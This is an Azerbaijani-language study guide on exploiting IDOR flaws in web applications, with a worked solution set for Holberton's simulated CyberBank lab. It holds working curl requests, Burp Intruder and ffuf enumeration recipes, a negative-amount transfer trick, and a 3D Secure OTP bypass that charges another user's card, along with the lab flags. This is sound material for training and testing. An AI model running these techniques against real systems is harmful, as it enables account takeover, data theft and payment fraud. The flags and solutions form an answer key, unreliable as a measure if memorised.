# 🔓 IDOR (Insecure Direct Object Reference) — Tam Eksploytasiya Bələdçisi

> **İmtahan Formatı:** Praktiki | **Mövzu:** Web Exploitation — IDOR  
> **Məqsəd:** Bu sənədi oxuyan istənilən şəxs IDOR boşluğunu addım-addım exploit edə bilsin.

---

## 📑 Məzmun

1. [IDOR Nədir? — Konseptual İzah](#1-idor-nədir--konseptual-izah)
2. [IDOR Növləri](#2-idor-növləri)
3. [Zəifliyin Aşkarlanması — Nəyə Baxmaq Lazımdır?](#3-zəifliyin-aşkarlanması--nəyə-baxmaq-lazımdır)
4. [Holberton Metodologiyası — 4 Addımlı Axın](#4-holberton-metodologiyası--4-addımlı-axın)
5. [Manual Eksploytasiya Texnikaları](#5-manual-eksploytasiya-texnikaları)
6. [Burp Suite ilə IDOR Test](#6-burp-suite-ilə-idor-test)
7. [curl ilə Komanda Sətri Testi](#7-curl-ilə-komanda-sətri-testi)
8. [Qabaqcıl Bypass Texnikaları](#8-qabaqcıl-bypass-texnikaları)
9. [CyberBank Lab — Holberton Task Həlləri](#9-cyberbank-lab--holberton-task-həlləri)
10. [Avtomatlaşdırılmış Alətlər](#10-avtomatlaşdırılmış-alətlər)
11. [Faydalı Saytlar & Alətlər](#11-faydalı-saytlar--alətlər)
12. [Quick Reference — Bütün Komandalar Bir Yerdə](#12-quick-reference--bütün-komandalar-bir-yerdə)

---

## 1. IDOR Nədir? — Konseptual İzah

### Tərif

**IDOR (Insecure Direct Object Reference)** — Tətbiq istifadəçinin göndərdiyi ID-ni birbaşa verilənlər bazasına ötürüb, **istifadəçinin həqiqətən həmin resursa girişi olub-olmadığını yoxlamadıqda** yarana bilən kritik təhlükəsizlik boşluğudur.

### Sadə Dillə İzah

Bir bankın saytında giriş etdikdə hesab məlumatların belə yüklənir:

```
https://bank.com/api/account?id=1337
```

Server gəlib verilənlər bazasından `id=1337` olan hesabı çəkir. Amma əgər server **"bu istifadəçinin bu hesaba girişi varmı?"** deyə yoxlamırsa — sən `id=1338` yazıb başqasının hesabını görə bilərsən.

### Zəif Kod nümunəsi (Python/Flask)

```python
# ❌ ZƏIF KOD — hər kəsin dataya çatmasına icazə verir
@app.route('/profile')
def get_profile():
    user_id = request.args.get('id')  # İstifadəçidən gəlir
    # YOXLAMA YOX! Birbaşa bazaya gedir
    user = db.query("SELECT * FROM users WHERE id = ?", user_id)
    return jsonify(user)

# ✅ DÜZGÜN KOD — sahiblik yoxlaması var
@app.route('/profile')
def get_profile():
    user_id = request.args.get('id')
    if current_user.id != int(user_id):  # ← Bu yoxlama olmalıdır
        return jsonify({"error": "Forbidden"}), 403
    user = db.query("SELECT * FROM users WHERE id = ?", user_id)
    return jsonify(user)
```

### Necə İşləyir — 4 Addım

```
1️⃣  İstifadəçi sorğu göndərir    →  GET /profile?id=1337
2️⃣  Server bazadan çəkir         →  SELECT * FROM users WHERE id=1337
3️⃣  Yoxlama YOX                  →  Sahiblik yoxlanmır!
4️⃣  Hücumçu ID dəyişdirir        →  GET /profile?id=1338 → qurbanın datası!
```

---

## 2. IDOR Növləri

### A. Üfüqi IDOR (Horizontal IDOR) — Ən Çox Rast Gəlinən

Eyni rolda olan istifadəçilərin bir-birinin datalarına qeyri-qanuni çatması.

```
Sən: User A (id=42)
Qurban: User B (id=43)

Normal: GET /api/invoice?id=1001 → sənin fakturam
IDOR:   GET /api/invoice?id=1002 → başqasının fakturam!
```

### B. Şaquli IDOR (Vertical IDOR) — Daha Ciddi

Aşağı səlahiyyətli istifadəçinin admin funksiyalarına çatması.

```
Normal user: GET /api/user/42/info        → öz məlumatları
Vertical:    GET /api/admin/users          → bütün istifadəçilər!
             PUT /api/user/42/role=admin   → özünü admin edir!
```

### C. ID Növünə Görə Təsnifat

| ID Tipi | Nümunə | Necə Exploit Edilir |
|---|---|---|
| Rəqəmsal (Numeric) | `?id=1337` | 1338, 1336, 1, 100... yoxla |
| UUID/GUID | `?id=41bb7160-d137-4ba0-bb54-a3b369a4732f` | API endpoint-lərdən başqasının UUID-ni tap |
| Base64 | `?id=MTMzNw==` | Dekod et, dəyişdir, yenidən encode et |
| Hash (MD5) | `?id=c4ca4238a0b923820dcc509a6f75849b` | Bu `1`-in MD5-idir; `2`-nin MD5-i ilə əvəzlə |
| Fayl adı | `?file=report_1337.pdf` | `report_1338.pdf` yoxla |

---

## 3. Zəifliyin Aşkarlanması — Nəyə Baxmaq Lazımdır?

### ID Olan Nöqtələri Tap

```
✅ URL Parametrləri
   /profile?id=42
   /invoice?order_id=1001
   /download?file=report_1337.pdf

✅ URL Path Segmentləri
   /users/42/profile
   /api/account/8dacc3e9bf294a1a91c37f5a49854315
   /api/customer/info/41bb7160d1374ba0bb54a3b369a4732f

✅ POST/PUT Body (JSON)
   {"user_id": 42, "email": "..."}
   {"account_id": "8dacc3e9..."}
   {"from_account": "...", "to_account": "..."}

✅ HTTP Başlıqları (Headers)
   X-User-ID: 42
   X-Account-Number: 101257799324

✅ Cookie Dəyərləri
   Cookie: user_id=42; account=1337

✅ GraphQL Sorğuları
   query { user(id: 42) { email, balance } }
```

### Browser Developer Tools ilə Analiz

1. `F12` → **Network** tabına keç
2. Saytda hər düyməni, hər linki sına
3. **Filter → XHR/Fetch** (yalnız API sorğularını göstər)
4. **Headers** tabında sorğu parametrlərini oxu
5. **Response** tabında nəyin qayıtdığını gör
6. Xüsusilə `/api/`, `/me`, `/info`, `/accounts`, `/transactions` endpointlərə diqqət et

---

## 4. Holberton Metodologiyası — 4 Addımlı Axın

Bu metodologiya Holberton-un CyberBank lab-ından götürülmüşdür.

### Addım 1: Kəşfiyyat (Reconnaissance)

Saytda gəziş et. Hər yerdə istifadəçi ID-lərinin (`id`, `uid`, `uuid`, `account`, `number`) göründüyü **hər nöqtəni** qeyd et.

```
Nəyə baxmaq lazımdır:
- URL-dəki parametrlər
- DevTools Network tabı (XHR sorğuları)
- Cavab (Response) JSON-larında gizli ID-lər
- Transfer, tarix, hesab hissələri
```

### Addım 2: İlkin Vəziyyəti Tut (Capture Baseline)

**Burp Suite** ilə öz hesabına aid legitim bir sorğunu tut.

- Cavabın ölçüsünü qeyd et
- JSON strukturunu anla
- Hansı ID-lərin göründüyünü qeyd et

### Addım 3: İstinad Yarat (Create Reference)

Başqa istifadəçiyə aid ID tap:

- İkinci hesabla giriş et (əgər varsa)
- Həmin istifadəçinin sessiya tokenini (Cookie) qeyd et
- Bəzən ödəmə hissəsində, transfer siyahısında, ya da `/me` API-dan başqalarının ID-lərini görə bilərsən

### Addım 4: Dəyişdir və Yoxla (Swap & Test)

```
Ssenar 1 (Data Oxuma):
  → Öz sessionun + Başqasının ID-si = Başqasının datası?

Ssenar 2 (Cross-Access):
  → Istifadəçi B-nin sessiyası + İstifadəçi A-nın ID-si
  → Əgər A-nın datası gəlirsə → IDOR təsdiqləndi!
```

---

## 5. Manual Eksploytasiya Texnikaları

### A. URL Parametrlərini Dəyişdir (Parameter Tampering)

```
Orijinal:  https://target.com/profile?id=1337
Hücum:     https://target.com/profile?id=1338
           https://target.com/profile?id=1
           https://target.com/profile?id=0
           https://target.com/profile?id=-1
```

UUID olan hallarda (CyberBank kimi):

```
Orijinal:  https://web0x06.hbtn/api/customer/info/41bb7160d1374ba0bb54a3b369a4732f
Hücum:     https://web0x06.hbtn/api/customer/info/[BAŞQA_UUID]
```

### B. POST/PUT Body Dəyişikliyi

Burp Suite Repeater-də JSON body-ni dəyiş:

```json
// ❌ Orijinal — öz hesabın
{
  "user_id": 42,
  "email": "senin@mail.com"
}

// ✅ Hücum — başqasının user_id-si
{
  "user_id": 43,
  "email": "sened@mail.com"
}
```

### C. HTTP Metod Dəyişikliyi (Method Tampering)

`GET /api/v1/invoice/1001` → **403 Forbidden** qaytarırsa, digər metodları yoxla:

```bash
curl -X POST https://target.com/api/v1/invoice/1001 -b "session=TOKEN"
curl -X PUT https://target.com/api/v1/invoice/1001 -b "session=TOKEN"
curl -X DELETE https://target.com/api/v1/invoice/1001 -b "session=TOKEN"
curl -X PATCH https://target.com/api/v1/invoice/1001 -b "session=TOKEN"
```

### D. API Versiya Dəyişikliyi

Köhnə versiyalarda avtorizasiya yoxlanışı unudula bilər:

```bash
# Yeni versiya — 403 qaytarır
GET /api/v2/user/1337

# Köhnə versiya — işləyir!
GET /api/v1/user/1337
GET /api/user/1337
GET /v1/user/1337
```

### E. Parametr Çirklənməsi (HTTP Parameter Pollution)

```
GET /api/get_profile?user_id=43&user_id=42
GET /api/get_profile?user_id=42&user_id=43
```

Bəzi arxa sistem çərçivələri sonuncu dəyəri, bəziləri birinci dəyəri götürür.

### F. Mənfi Dəyər Testi

```
?id=-1        → Xüsusi hesab açar bilər
?id=0         → Admin hesabı ola bilər
?amount=-5000 → Mənfi transfer (balansı artırmaq üçün)
```

---

## 6. Burp Suite ilə IDOR Test

### Burp Suite — Əsas İş Axını

```
1. Burp Suite aç → Proxy → Intercept on
2. Brauzer → Burp proxy (127.0.0.1:8080) ayarla
3. Saytda hərəkət et, sorğuları tut
4. Tutulmuş sorğunu → Sağ klik → Send to Repeater
5. Repeater-də ID dəyərini dəyiş
6. Send düyməsinə bas, cavabı analiz et
```

### Repeater ilə Manual Test

```http
GET /api/invoice?id=1001 HTTP/1.1
Host: target.com
Cookie: session=abc123

→ Cavabda başqa istifadəçinin datası görünürsə = IDOR!
```

```http
POST /api/accounts/transfer_to/[TARGET_ACCOUNT_ID] HTTP/1.1
Host: web0x06.hbtn
Cookie: session=YOUR_SESSION
Content-Type: application/json

{
  "amount": 350,
  "raison": "same",
  "account_id": "37747e63e26041e697a0c6d89810c045",
  "routing": "106190002",
  "number": "107515413187"
}
```

### Burp Intruder — Avtomatik ID Enumeration

Çoxlu ID-ləri sürətlə yoxlamaq üçün:

```
1. Sorğunu Intruder-ə göndər (Sağ klik → Send to Intruder)
2. Positions tabı: ID dəyərinin ətrafına §§ qoy
   GET /api/order/§1001§ HTTP/1.1
3. Payloads tabı:
   - Payload type: Numbers
   - From: 1000, To: 1100, Step: 1
4. Options: Grep-Match: "user_name" (uğurlu cavabın işarəsi)
5. Attack düyməsinə bas
6. Response Length-ə görə sırala — fərqli ölçü = fərqli məzmun = IDOR!
```

### Autorize Plagini (Mütləq istifadə et!)

```
Quraşdırma:
BApp Store → "Autorize" → Install

İstifadə:
1. İstifadəçi B kimi giriş et
2. İstifadəçi B-nin Cookie-sini kopyala
3. Autorize tabına keç → Cookie sahəsinə yapışdır
4. "Autorize is on" düyməsinə bas (yaşıllaşır)
5. İstifadəçi A kimi gəziş et
6. Autorize arxa planda hər sorğunu B-nin adından göndərir
7. Nəticə: 🟢 Bypassed = IDOR tapıldı!
            🟡 Is enforced?? = Yoxlanılmalı
            🔴 Enforced = Qorunur
```

---

## 7. curl ilə Komanda Sətri Testi

### Əsas Sintaksis

```bash
# GET sorğusu
curl -s -b 'session=SENIN_TOKEN' 'http://target.com/api/user?id=42'

# Başqa ID ilə
curl -s -b 'session=SENIN_TOKEN' 'http://target.com/api/user?id=43'

# Cavabları müqayisə et — fərqli = IDOR!
```

### POST/PUT Sorğuları

```bash
# POST ilə JSON göndər
curl -X POST 'http://target.com/api/user/update' \
     -H 'Content-Type: application/json' \
     -H 'Cookie: session=SENIN_TOKEN' \
     -d '{"user_id": 43, "email": "yeni@mail.com"}'

# PUT ilə
curl -X PUT 'http://target.com/api/account' \
     -H 'Content-Type: application/json' \
     -b 'session=SENIN_TOKEN' \
     -d '{"account_id": "hedef_account", "role": "admin"}'
```

### Loop ilə Avtomatik Enumeration

```bash
# 1000-dən 1050-ə qədər bütün ID-ləri yoxla
for id in {1000..1050}; do
    echo -n "ID=$id: "
    curl -s -b "session=SENIN_TOKEN" \
         "http://target.com/dashboard?id=$id" | grep -i "username"
done

# UUID siyahısından test (fayldan oxu)
while read uuid; do
    result=$(curl -s -b "session=TOKEN" \
             "http://web0x06.hbtn/api/customer/info/$uuid")
    echo "UUID=$uuid: $result" | head -c 100
    echo
done < uuid_list.txt
```

### Cavabları Müqayisə Et

```bash
# Öz hesabın
curl -s -b "session=TOKEN" "http://target.com/api/user?id=42" > own.json

# Başqasının hesabı
curl -s -b "session=TOKEN" "http://target.com/api/user?id=43" > other.json

# Fərqi gör
diff own.json other.json
```

---

## 8. Qabaqcıl Bypass Texnikaları

### A. Kodlaşdırma ilə ID Manipulyasiyası (Encoding)

**Base64 ID-lər:**

```bash
# Mövcud ID-ni dekod et
echo "MTMzNw==" | base64 -d    → 1337

# Növbəti ID-ni encode et
echo -n "1338" | base64         → MTMzOA==

# URL-ə yapışdır
?id=MTMzOA==
```

**Hex ID-lər:**

```bash
# Decode
echo "31333337" | xxd -r -p     → 1337

# Encode
echo -n "1338" | xxd -p         → 31333338
```

**MD5 Hash ID-lər:**

```bash
# 1-in MD5-i bu xana yazan nömrənin hash-idir
echo -n "1" | md5sum            → c4ca4238a0b923820dcc509a6f75849b
echo -n "2" | md5sum            → c81e728d9d4c2f636f067f89cc14862c

# ?id=c81e728d9d4c2f636f067f89cc14862c ilə yoxla
```

**CyberChef ilə (Brauzer əsaslı):**

→ `https://gchq.github.io/CyberChef/` → "From Base64" əməliyyatı

### B. Content-Type Dəyişikliyi

```bash
# JSON bloklayırsa, form data kimi göndər
curl -X POST 'http://target.com/api/update' \
     -H 'Content-Type: application/x-www-form-urlencoded' \
     -b 'session=TOKEN' \
     -d 'user_id=43&email=test@mail.com'
```

### C. Parametr Adlarını Dəyişdirmə

```
user_id=42     →  uid=42
                  userId=42
                  user[id]=42
                  id=42
                  account_id=42
```

### D. Obyekt Növü Manipulyasiyası

```json
// Rəqəm kimi
{"user_id": 42}

// String kimi
{"user_id": "42"}

// Massiv kimi
{"user_id": [42]}
```

---

## 9. CyberBank Lab — Holberton Task Həlləri

> Bu bölmə Holberton-un CyberBank simulyasiya mühitindən götürülmüşdür.
> Real tətbiqlərə tətbiq etmək qeyri-qanuni və etik deyildir.

### Task 0: İstifadəçi ID-lərini Tap

**Hədəf:** Digər istifadəçilərin UUID-lərini tap.

```
Addım 1: CyberBank-a giriş et (http://web0x06.hbtn)

Addım 2: DevTools → F12 → Network tabı → XHR filtr

Addım 3: Dashboard-da gəzin, "me" hissəsinə bax:
         GET /api/customer/info/me → öz məlumatların

Addım 4: Transfer hissəsinə get, digər istifadəçiləri seç
         Transfer siyahısında receiver_payment_id görünür
         Bu başqasının UUID-si!

Addım 5: Tapılan UUID-ni API-yə ver:
```

```bash
curl -s -b "session=SENIN_SESSION" \
     "http://web0x06.hbtn/api/customer/info/41bb7160d1374ba0bb54a3b369a4732f"
```

**Cavab (Robert Martinez-in datası):**

```json
{
  "flag_0": "9abe48128c6cde2f96eb81c6a485386f",
  "message": {
    "accounts_id": [
      "8dacc3e9bf294a1a91c37f5a49854315",
      "d343a5cd5a524a26bc5ee294b2bd1760"
    ],
    "firstname": "Robert",
    "id": "41bb7160d1374ba0bb54a3b369a4732f",
    "username": "robert.martinez"
  }
}
```

---

### Task 1: Hesab Nömrəsi ilə Balans Açıqlaması

**Hədəf:** Tapılan UUID-dən `accounts_id`-ləri götür, `/accounts/info/` endpoint-indən balansı gör.

```bash
# Task 0-da tapılan accounts_id-ni istifadə et
curl -s -b "session=SENIN_SESSION" \
     "http://web0x06.hbtn/api/accounts/info/8dacc3e9bf294a1a91c37f5a49854315"
```

**Cavab:**

```json
{
  "flag_1": "9df112c36c7fe2df381050e50aef4204",
  "message": {
    "balance": 1189.6,
    "customer_id": "41bb7160d1374ba0bb54a3b369a4732f",
    "number": "101257799324",
    "routing": "106190005"
  }
}
```

**Burp Suite ilə:**

```
1. Dashboard-da hesab hissəsinə klik et
2. Burp → Network-də POST /api/accounts/info sorğusunu gör
3. Repeater-ə göndər
4. account_id-ni dəyiş → Send
```

---

### Task 2: Köçürmə Manipulyasiyası — Balansı Artır

**Hədəf:** Transfer funksiyasını manipulyasiya edərək balansı $10K-dan yuxarı apar.

**İlkin Anlama:**

```
Normal transfer:
  Sen → Başqasına pul göndər

Manipulyasiya:
  Özündən özünə mənfi məbləğ göndər → Balans artır!
  Ya da başqasından özünə çox məbləğ göndər
```

**Burp Suite ilə Addımlar:**

```
1. Dashboard → Transfer düyməsinə klik et
2. Başqa hesabı seç, $350 yaz, Confirm et
3. Burp → Sorğunu tut → Repeater-ə göndər
```

**Tutulmuş sorğu:**

```http
POST /api/accounts/transfer_to/e3c9e5d48de04e20a67485cbae8d1a34 HTTP/1.1
Host: web0x06.hbtn
Cookie: session=SENIN_SESSION
Content-Type: application/json

{
  "amount": 350,
  "raison": "same",
  "account_id": "37747e63e26041e697a0c6d89810c045",
  "routing": "106190002",
  "number": "107515413187"
}
```

**Manipulyasiya — Mənfi Məbləğ:**

```http
POST /api/accounts/transfer_to/e3c9e5d48de04e20a67485cbae8d1a34 HTTP/1.1
Host: web0x06.hbtn
Cookie: session=SENIN_SESSION
Content-Type: application/json

{
  "amount": -5000,
  "raison": "same",
  "account_id": "37747e63e26041e697a0c6d89810c045",
  "routing": "106190002",
  "number": "107515413187"
}
```

Mənfi transfer öz hesabına `+5000` kimi əks olunur → balans $10K-ı keçir → `flag_2` görünür.

---

### Task 3: 3D Secure Bypass — Ödəniş Saxtalaşdırması

**Hədəf:** Başqasının kart məlumatları ilə ödəniş et, amma 3DS OTP doğrulamasını öz hesabına yönləndir.

**Addım 1: Kart məlumatlarını tap**

Task 1-dən əldə etdiyimiz hesab məlumatlarında `cards_id` var idi. Həmin kart ID-sini `/api/cards/info/` endpointinə ver:

```bash
curl -s -b "session=TOKEN" \
     "http://web0x06.hbtn/api/cards/info/6bbca43f97014d34b9baf0d027b03dfc"
```

**Cavab (Robert-in kart məlumatları):**

```json
{
  "cvv": "687",
  "e_month": "12",
  "e_year": "2028",
  "id": "6bbca43f97014d34b9baf0d027b03dfc",
  "number": "50006190000076395",
  "otp": "*****"
}
```

**Addım 2: OTP-ni tap**

`/api/cards/3dsecure/{card_id}` endpointindən real OTP-ni al:

```bash
curl -s -b "session=TOKEN" \
     "http://web0x06.hbtn/api/cards/3dsecure/6bbca43f97014d34b9baf0d027b03dfc"
```

**Cavab:**

```json
{
  "message": {
    "OTP": "78027",
    "cvv": "687"
  }
}
```

**Addım 3: Ödəniş başlat (Robert-in məlumatları ilə)**

`/upgrade` səhifəsindən ödəniş əməliyyatını başlat:

```bash
curl -X POST "http://web0x06.hbtn/api/cards/init_payment" \
     -H "Content-Type: application/json" \
     -b "session=SENIN_SESSION" \
     -d '{
       "firstname": "Robert",
       "lastname": "Martinez",
       "number": "50006190000076395",
       "e_month": "12",
       "e_year": "2028",
       "cvv": "687",
       "amount": 9.99
     }'
```

**Cavab — transaction_id alırıq:**

```json
{
  "message": {
    "transaction_id": "7e81795e9f2045e4850c1d5205febde1"
  }
}
```

**Addım 4: OTP-ni öz card_id-nə yönləndir (IDOR!)**

Burda əsl IDOR baş verir: ödəniş Robert-in adından başlamışdı, amma OTP doğrulamasında **öz kart ID-ni** (özünün `card_id`-ni) və Robert-in OTP-sini istifadə edirik:

```bash
curl -X POST "http://web0x06.hbtn/api/cards/confirm_payment/OZ_CARD_ID" \
     -H "Content-Type: application/json" \
     -b "session=SENIN_SESSION" \
     -d '{
       "otp": "78027",
       "number": "50006190000076395"
     }'
```

**Nəticə:** Ödəniş Robert-in kartından çıxılır, OTP öz hesabına əsasən doğrulanır → `flag_3` görünür!

---

## 10. Avtomatlaşdırılmış Alətlər

### ffuf ilə ID Fuzzing

```bash
# URL parametrlərini fuzz et
ffuf -u "http://target.com/api/user?id=FUZZ" \
     -w /usr/share/seclists/Fuzzing/4-digits-0000-9999.txt \
     -H "Cookie: session=TOKEN" \
     -fs 0 -mc 200

# Path parametrini fuzz et
ffuf -u "http://target.com/api/invoice/FUZZ" \
     -w /usr/share/seclists/Fuzzing/4-digits-0000-9999.txt \
     -H "Cookie: session=TOKEN" \
     -fs 0 -mc 200

# UUID siyahısı ilə test
ffuf -u "http://target.com/api/user/FUZZ" \
     -w uuid_list.txt \
     -H "Cookie: session=TOKEN" \
     -fs 0

# Flags açıqlaması:
# -u  : URL (FUZZ yerinə payload gəlir)
# -w  : Wordlist
# -H  : HTTP başlığı (sessiya cookie-si üçün)
# -fs 0 : Ölçüsü 0 olan cavabları gizlət (boş cavablar)
# -mc 200 : Yalnız 200 OK cavabları göstər
# -t 50   : 50 paralel sorğu
```

---

## 11. Faydalı Saytlar & Alətlər

### 🌐 Məşq Platformaları

| Sayt | Məzmun |
|---|---|
| [PortSwigger Web Security Academy — IDOR](https://portswigger.net/web-security/access-control/idor) | Ən ətraflı nəzəriyyə + praktiki lab-lar |
| [HackTheBox](https://www.hackthebox.com) | Real IDOR ssenariləri |
| [TryHackMe](https://tryhackme.com) | IDOR room-lar (IDOR challenge) |

### 🛠️ Alətlər

| Alət | Məqsəd | Necə İstifadə |
|---|---|---|
| **Burp Suite** | HTTP sorğularını tut, dəyiş, göndər | Proxy → Repeater → Intruder |
| **Autorize (Burp Plugin)** | İki sessiya ilə avtomatik IDOR testi | BApp Store-dan yüklə |
| **AutoRepeater (Burp Plugin)** | Sorğuları avtomatik dəyişib göndər | BApp Store-dan yüklə |
| **ffuf** | URL parametrlərini fuzz et | `ffuf -u URL/FUZZ -w wordlist` |
| **curl** | Komanda sətri HTTP sorğuları | `-b cookie -X POST -d data` |

### 📚 Referans Saytlar

| Sayt | Məzmun |
|---|---|
| [PayloadsAllTheThings — IDOR](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Direct%20Object%20References) | Payload kolleksiyası |
| [HackTricks — IDOR](https://book.hacktricks.xyz/pentesting-web/idor) | Metodoloji bələdçi |
| [OWASP IDOR](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References) | Rəsmi sənəd |

### 🔧 Online Kodlaşdırma Alətləri

| Sayt | Məqsəd |
|---|---|
| [CyberChef](https://gchq.github.io/CyberChef/) | Base64, Hex, URL encode/decode |
| [CrackStation](https://crackstation.net) | MD5/SHA1 hash-ləri kır |

---

## 12. Quick Reference — Bütün Komandalar Bir Yerdə

```bash
# ===== KƏŞFİYYAT =====
# DevTools Network tabı → XHR sorğularına bax
# URL-lərdə ?id=, ?user_id=, ?account= izlə
# JSON cavablarda gizli ID-lər ara

# ===== CURL İLE MANUAL TEST =====
# Sadə GET testi
curl -s -b "session=TOKEN" "http://target.com/api/user?id=42"

# Başqa ID ilə
curl -s -b "session=TOKEN" "http://target.com/api/user?id=43"

# Path IDOR
curl -s -b "session=TOKEN" "http://target.com/api/user/43/profile"

# POST body IDOR
curl -X POST -H "Content-Type: application/json" \
     -b "session=TOKEN" \
     -d '{"user_id": 43}' \
     "http://target.com/api/update"

# HTTP Metod dəyişikliyi
curl -X PUT -b "session=TOKEN" "http://target.com/api/invoice/1001"
curl -X DELETE -b "session=TOKEN" "http://target.com/api/invoice/1001"

# Mənfi məbləğ (balans manipulyasiyası)
curl -X POST -H "Content-Type: application/json" \
     -b "session=TOKEN" \
     -d '{"amount": -5000, "account_id": "TARGET_ACCOUNT"}' \
     "http://target.com/api/transfer"

# Loop ilə avtomatik test (rəqəmsal ID-lər)
for id in {1..100}; do
    echo -n "ID=$id: "
    curl -s -b "session=TOKEN" "http://target.com/api/user?id=$id" | \
    python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('username','not found'))"
done

# ===== KODLAŞDIRMA =====
# Base64 decode
echo "MTMzNw==" | base64 -d

# Base64 encode
echo -n "1338" | base64

# MD5 hash
echo -n "2" | md5sum

# ===== FFUF İLE FUZZING =====
# Rəqəmsal ID fuzzing
ffuf -u "http://target.com/api/invoice/FUZZ" \
     -w /usr/share/seclists/Fuzzing/4-digits-0000-9999.txt \
     -H "Cookie: session=TOKEN" \
     -mc 200 -fs 0

# Böyük aralıq
ffuf -u "http://target.com/user?id=FUZZ" \
     -w /usr/share/seclists/Fuzzing/6-digits-000000-999999.txt \
     -H "Cookie: session=TOKEN" \
     -mc 200

# ===== CYBERBANK API REFERENCE =====
# Öz məlumatların
GET /api/customer/info/me

# Başqasının məlumatları (IDOR)
GET /api/customer/info/{USER_UUID}

# Hesab balansı (IDOR)
GET /api/accounts/info/{ACCOUNT_UUID}

# Transfer (manipulyasiya)
POST /api/accounts/transfer_to/{TARGET_ACCOUNT_ID}
Body: {"amount": -5000, "raison": "same", "account_id": "...", "routing": "...", "number": "..."}

# Kart məlumatları (IDOR)
GET /api/cards/info/{CARD_UUID}

# OTP al
GET /api/cards/3dsecure/{CARD_UUID}

# Ödəniş başlat
POST /api/cards/init_payment

# 3DS bypass (IDOR — öz card_id + başqasının OTP)
POST /api/cards/confirm_payment/{OZ_CARD_UUID}
Body: {"otp": "78027", "number": "HEDEF_KART_NOMRESI"}
```

---

## 🔁 IDOR Test Axını — Ümumi Ardıcıllıq

```
1. Kəşfiyyat         → ID-lərin göründüyü nöqtələri tap
        ↓
2. Baseline tut      → Burp ilə legitim sorğunu tut
        ↓
3. ID-ni tap         → Başqasına aid ID-ni müəyyən et
        ↓
4. Dəyiş & Göndər   → Repeater-də ID-ni dəyiş, göndər
        ↓
5. Cavabı analiz et  → Başqasının datası gəlirsə = IDOR!
        ↓
6. Enumeration       → ID ±1, ±100; Intruder ilə avtomatlaşdır
        ↓
7. Dərinliyə get     → Tapılan datadan növbəti endpointlər tapılır
        ↓
8. Sənədləşdir       → Screenshot, sorğu/cavab, flag
```

---

## ⚠️ IDOR Növbəti Addımlar Cədvəli

| Tapılan | Növbəti Addım |
|---|---|
| Başqa istifadəçinin UUID-i | `/api/customer/info/{UUID}` çək |
| `accounts_id` siyahısı | `/api/accounts/info/{account_id}` çək |
| `cards_id` siyahısı | `/api/cards/info/{card_id}` çək |
| Transfer endpoint-i | Mənfi məbləğ və ya başqa hesabdan göndər |
| OTP endpoint-i | `3dsecure/{card_id}` ilə OTP al, öz card_id-nə bypass et |

---
